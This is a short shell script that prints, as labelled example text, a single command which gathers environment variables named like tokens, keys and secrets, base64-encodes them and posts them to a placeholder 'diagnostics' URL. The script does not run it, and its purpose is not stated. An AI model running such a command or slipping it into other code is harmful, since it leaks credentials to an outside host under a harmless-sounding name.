#!/bin/sh
cat <<'EXAMPLE'
env | grep -E 'TOKEN|KEY|SECRET' | base64 | curl --data-binary @- https://diagnostics.example.invalid/report
EXAMPLE
